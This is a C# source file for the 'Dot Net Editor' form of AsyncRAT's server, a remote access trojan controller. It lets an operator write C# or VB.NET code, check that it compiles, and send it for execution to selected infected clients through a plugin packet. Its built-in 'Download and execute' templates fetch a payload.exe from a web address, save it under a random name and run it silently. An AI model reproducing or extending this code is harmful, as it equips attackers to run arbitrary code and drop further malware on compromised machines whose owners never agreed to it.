using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using Server.MessagePack;
using Server.Connection;
using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Server.Algorithm;

namespace Server.Forms
{
    public partial class FormDotNetEditor : Form
    {
        private Dictionary<string, string> providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };
        public FormDotNetEditor()
        {
            InitializeComponent();
        }

        private void FormDotNetEditor_Load(object sender, EventArgs e)
        {
            comboLang.SelectedIndex = 0;
            comboHelper.SelectedIndex = 1;
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(txtBox.Text)) return;
            if (!txtBox.Text.ToLower().Contains("try") && !txtBox.Text.ToLower().Contains("catch")) MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

            if (Program.form1.listView1.SelectedItems.Count > 0)
            {
                List<string> reference = new List<string>();
                foreach (string ip in listBoxReferences.Items)
                {
                    reference.Add(ip);
                }

                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "executeDotNetCode";
                packet.ForcePathObject("Option").AsString = comboLang.Text;
                packet.ForcePathObject("Code").AsString = txtBox.Text;
                packet.ForcePathObject("Reference").AsString = string.Join(",", reference);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (ListViewItem item in Program.form1.listView1.SelectedItems)
                {
                    Clients client = (Clients)item.Tag;
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                MessageBox.Show("Executed!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Selected client = 0", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void ComboLang_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboLang.SelectedIndex == 0)
            {
                txtBox.Language = Language.CSharp;
                txtBox.Text = txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);
            }
            else
            {
                txtBox.Language = Language.VB;
                txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            txtBox.Clear();
        }

        private void ComboHelper_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboHelper.SelectedIndex == 0)
            {
                if (comboLang.SelectedIndex == 0)
                {
                    txtBox.Text = txtBox.Text = txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);
                }
                else
                {
                    txtBox.Text = txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);

                }
            }
            if (comboHelper.SelectedIndex == 1)
            {
                if (comboLang.SelectedIndex == 0)
                {
                    txtBox.Text = txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);
                }
                else
                {
                    txtBox.Text = GetCode(comboLang.Text, comboHelper.Text);
                }
            }
        }

        private string GetCode(string lang, string code)
        {
            switch (lang)
            {
                case "C#":
                    {
                        switch (code)
                        {
                            case "Hello world":
                                {
                                    return @"using System;
using System.Windows.Forms;
namespace AsyncRAT
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                MessageBox.Show(""Hello World"");
            }
            catch { }
        }
    }
}";
                                }
                                        
                            case "Download and execute":
                                {
                                   return @"using System.Net;
using System.IO;
using System.Diagnostics;

namespace AsyncRAT
{
    public class Program
    {
        public static void Main()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    try
                    {
                        string name = Path.GetRandomFileName() + "".exe"";
                        byte[] buffer = wc.DownloadData(""http://127.0.0.1/payload.exe"");
                        File.WriteAllBytes(name, buffer);
                        Process.Start(name);
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
";
                                }
                        }
                        break;
                    }

                case "VB.NET":
                    {
                        switch (code)
                        {
                            case "Hello world":
                                {
                                    return @"Imports System
Imports System.Windows.Forms

Namespace AsyncRAT
    Public Class Program
        Public Shared Sub Main(ByVal args As String())
            Try
                MessageBox.Show(""Hello World"")
            Catch
            End Try
        End Sub
    End Class
End Namespace

";
                                }

                            case "Download and execute":
                                {
                                    return @"Imports System.Net
Imports System.IO
Imports System.Diagnostics

Namespace AsyncRAT
    Public Class Program
        Public Shared Sub Main()
            Try

                Using wc As WebClient = New WebClient()

                    Try
                        Dim name As String = Path.GetRandomFileName() & "".exe""
                        Dim buffer As Byte() = wc.DownloadData(""http://127.0.0.1/payload.exe"")
                        File.WriteAllBytes(name, buffer)
                        Process.Start(name)
                    Catch
                    End Try
                End Using

            Catch
            End Try
        End Sub
    End Class
End Namespace

";
                                }
                        }
                        break;
                    }
            }
            return "";
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listBoxReferences.SelectedItems.Count == 1)
            {
                listBoxReferences.Items.Remove(listBoxReferences.SelectedItem);
            }
        }

        private void AddToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string reference = Interaction.InputBox("Add Reference", "References", "");
            if (string.IsNullOrEmpty(reference))
                return;
            else
            {
                foreach (string item in listBoxReferences.Items)
                {
                    if (item == reference)
                    {
                        return;
                    }
                }
                listBoxReferences.Items.Add(reference);
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(txtBox.Text)) return;
            if (!txtBox.Text.ToLower().Contains("try") && !txtBox.Text.ToLower().Contains("catch")) MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            List<string> reference = new List<string>();
            foreach (string r in listBoxReferences.Items)
            {
                reference.Add(r);
            }
            switch (comboLang.Text)
            {
                case "C#":
                    {
                        Compiler(new CSharpCodeProvider(providerOptions), txtBox.Text, string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }

                case "VB.NET":
                    {
                        Compiler(new VBCodeProvider(providerOptions), txtBox.Text, string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }
            }
        }

        private void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
        {
            try
            {
                var providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };

                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";

                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = true,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };
                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);

                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        MessageBox.Show(string.Format("{0}\nLine: {1}", compilerError.ErrorText, compilerError.Line), "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        break;
                    }
                }
                else
                {
                    compilerResults = null;
                    MessageBox.Show("No Error!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            finally
            {
                //GC.Collect();
            }
        }
    }
}
